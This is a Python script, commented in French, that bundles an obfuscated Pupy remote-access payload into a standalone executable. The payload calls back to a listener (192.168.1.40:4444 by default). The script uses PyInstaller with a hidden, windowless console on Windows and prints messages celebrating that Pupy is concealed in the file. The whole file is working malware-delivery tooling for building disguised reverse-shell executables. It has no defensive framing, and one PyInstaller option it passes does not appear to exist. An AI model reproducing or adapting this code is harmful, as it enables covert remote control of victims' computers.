#!/usr/bin/env python3
"""
Advanced Bundler with Pupy Integration
Bundler avancé qui crée des executables avec Pupy obfusqué et caché
"""

import os
import sys
import subprocess
import tempfile
from pathlib import Path


class PupyBundler:
    """Bundler avancé avec Pupy intégré"""
    
    def __init__(self, listener_ip: str, listener_port: int, obfuscation_level: int = 2, platform: str = "windows"):
        self.listener_ip = listener_ip
        self.listener_port = listener_port
        self.obfuscation_level = obfuscation_level
        self.platform = platform
        self.output_dir = Path.cwd() / "dist"
        self.output_dir.mkdir(exist_ok=True)
    
    def _generate_obfuscated_payload(self) -> str:
        """Génère le payload Pupy obfusqué"""
        from pupy_obfuscated_payload import create_obfuscated_payload
        
        payload = create_obfuscated_payload(
            self.listener_ip,
            self.listener_port,
            self.obfuscation_level
        )
        return payload
    
    def _create_stub_exe(self, payload_code: str) -> str:
        """Crée le stub Python qui contient le payload"""
        
        stub_code = f'''#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Pupy Bundled Application
Compiled with Advanced Obfuscation
"""

import sys
import os

# Niveau d'obfuscation appliqué: {self.obfuscation_level}
# Listener: {self.listener_ip}:{self.listener_port}

# === PAYLOAD CACHÉ ===
{payload_code}
'''
        return stub_code
    
    def bundle(self, output_name: str = "payload") -> bool:
        """Bundle l'application avec Pupy"""
        try:
            print(f"[*] Génération du payload Pupy obfusqué...")
            print(f"[*] Niveau d'obfuscation: {self.obfuscation_level}")
            print(f"[*] Listener: {self.listener_ip}:{self.listener_port}")
            
            # Générer le payload obfusqué
            payload = self._generate_obfuscated_payload()
            
            # Créer le stub
            stub_code = self._create_stub_exe(payload)
            
            # Écrire le code dans un fichier temporaire
            with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
                f.write(stub_code)
                temp_py_file = f.name
            
            print(f"[*] Fichier Python généré: {temp_py_file}")
            print(f"[*] Démarrage de PyInstaller pour créer l'executable...")
            
            # Déterminer l'extension et les options PyInstaller
            if self.platform == "windows":
                exe_name = f"{output_name}.exe"
                pyinstaller_args = [
                    "pyinstaller",
                    "--onefile",
                    "--windowed",  # Sans console
                    "--icon", "NONE",
                    "--distpath", str(self.output_dir),
                    "--specpath", str(self.output_dir / "specs"),
                    "--buildpath", str(self.output_dir / "build"),
                    "--name", output_name,
                    temp_py_file
                ]
            elif self.platform == "macos":
                exe_name = f"{output_name}"
                pyinstaller_args = [
                    "pyinstaller",
                    "--onefile",
                    "--distpath", str(self.output_dir),
                    "--specpath", str(self.output_dir / "specs"),
                    "--buildpath", str(self.output_dir / "build"),
                    "--name", output_name,
                    temp_py_file
                ]
            else:
                exe_name = f"{output_name}"
                pyinstaller_args = [
                    "pyinstaller",
                    "--onefile",
                    "--distpath", str(self.output_dir),
                    "--specpath", str(self.output_dir / "specs"),
                    "--buildpath", str(self.output_dir / "build"),
                    "--name", output_name,
                    temp_py_file
                ]
            
            # Exécuter PyInstaller
            result = subprocess.run(pyinstaller_args, capture_output=True, text=True)
            
            if result.returncode != 0:
                print(f"[!] Erreur PyInstaller: {result.stderr}")
                return False
            
            # Vérifier que l'exécutable a été créé
            exe_path = self.output_dir / exe_name
            if exe_path.exists():
                file_size = exe_path.stat().st_size / 1024 / 1024
                print(f"[+] Executable créé: {exe_path}")
                print(f"[+] Taille: {file_size:.2f} MB")
                print(f"[+] Pupy est caché dans l'executable!")
                return True
            else:
                print(f"[!] Erreur: L'executable n'a pas été créé")
                return False
        
        except Exception as e:
            print(f"[!] Erreur lors du bundling: {str(e)}")
            return False
        
        finally:
            # Nettoyer le fichier temporaire
            if 'temp_py_file' in locals() and os.path.exists(temp_py_file):
                os.unlink(temp_py_file)


def main():
    """Test du bundler"""
    bundler = PupyBundler(
        listener_ip="192.168.1.40",
        listener_port=4444,
        obfuscation_level=2,
        platform="windows"
    )
    
    success = bundler.bundle(output_name="pupy_payload")
    
    if success:
        print("\n" + "="*70)
        print("✅ BUNDLING SUCCESSFUL!")
        print("="*70)
    else:
        print("\n" + "="*70)
        print("❌ BUNDLING FAILED!")
        print("="*70)


if __name__ == "__main__":
    main()
